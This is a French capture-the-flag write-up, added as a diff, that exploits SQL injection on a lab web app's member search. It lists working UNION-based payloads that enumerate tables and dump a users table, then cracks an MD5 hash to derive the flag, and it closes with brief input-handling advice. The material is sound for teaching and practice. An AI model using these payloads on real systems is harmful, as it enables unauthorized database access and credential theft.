@@ -1,0 +1,65 @@
+http://192.168.57.12/?page=member
+
+Ici on peut injecter du SQL dans le formulaire de recherche.
+J'ai commencé par mettre tout simplement
+// "1 or 1=1"
+pour voir si il était possible de l'exploiter,
+ce qui m'a afficher tous les utilisateurs (sans leurs IDs) ce qui veut donc dire que oui.
+
+J'ai pu voir un utilisateur nommé GetThe Flag, et je présume donc que son ID est le flag, reste à trouvdr une façon de l'afficher.
+
+L'injection:
+// "1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns"
+me permet d'afficher les noms des tables et de leurs colonnes, ce qui peut m'aider par la suite.
+Ainsi pour la table users, je retrouve cela:
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : user_id
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : first_name
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : last_name
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : town
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : country
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : planet
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : Commentaire
+
+ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
+First name: users
+Surname : countersign
+
+Ce qui veut donc dire que la table users contient ces colonnes:
+user_id first_name last_name town country planet Commentaire countersign
+
+En faisant cela:
+// "1 and 1=2 union select Commentaire, first_name from users"
+Nous pouvons afficher la valeur de Commentaire qui nous indique:
+"Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
+
+En affichant le countersign:
+// "1 and 1=2 union select countersign, first_name from users"
+Nous trouvons cette chaine: 5ff9d0165b4f92b14994e5c685cdce28
+En la déchiffrant (md5), nous tombons donc sur "FortyTwo"
+ce qui correspond bien à ce que nous cherchons. Une fois mis en minuscule
+puis en la chiffrand en Sh256, nous tombons sur le flag.
+
+La bonne pratique est tout simplement de ne pas mettre "bêtement" ce que
+nous envoie l'utilisateur dans notre requête SQL, mais de parser l'entrée
+pour que SEULEMENT ce que nous attendons soit émit dans la requête.
